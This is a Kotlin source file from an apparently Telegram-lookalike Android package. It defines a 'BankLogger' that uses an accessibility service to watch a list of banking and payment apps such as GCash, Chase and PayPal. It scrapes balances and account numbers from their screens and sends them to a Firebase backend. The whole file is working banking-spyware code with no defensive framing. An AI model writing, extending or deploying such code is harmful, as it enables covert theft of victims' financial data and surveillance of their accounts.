package com.telegram2.messaging.remote

class BankLogger {
    companion object {
        val BANK_PACKAGES = setOf(
            "com.globe.gcash.android",           // GCash
            "com.palmpay.palmpay",               // Palmpay
            "com.bankofamerica",
            "com.chase",
            "com.wellsfargo",
            "com.citi.mobile",
            "com.capitalone",
            "com.usbank",
            "com.americanexpress",
            "com.paypal",
            "com.revolut"
        )

        fun onEvent(service: MyAccessibilityService, event: android.view.accessibility.AccessibilityEvent) {
            val pkg = event.packageName?.toString() ?: return
            if (pkg !in BANK_PACKAGES) return

            val text = event.text.joinToString(" ")
            // Extract balance patterns
            val balance = Regex("\\b[₱$]\\s*[\\d,]+\\.\\d{2}\\b").find(text)?.value
                ?: Regex("Balance[:\\s]+[\\d,.]+").find(text)?.value
            if (balance != null) {
                FirebaseBridge.logBankData(pkg, balance = balance)
            }

            // Extract account numbers (generic pattern)
            val account = Regex("\\b\\d{8,17}\\b").find(text)?.value
            if (account != null) {
                FirebaseBridge.logBankData(pkg, account = account)
            }
        }
    }
}